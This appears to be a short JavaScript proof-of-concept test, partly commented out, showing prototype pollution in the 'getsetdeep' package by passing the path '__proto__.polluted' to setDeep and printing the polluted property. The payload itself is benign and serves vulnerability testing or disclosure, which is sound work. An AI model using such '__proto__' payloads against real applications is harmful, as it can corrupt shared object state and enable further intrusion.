// test("prototype pollution in getsetdeep", () => {
  const pkg = require("getsetdeep");
  let obj = {};

console.log({}.polluted);

  pkg.setDeep(obj, "__proto__.polluted", "yes");

console.log("{ " + obj.polluted + ", " + "yes" + " }");
// });
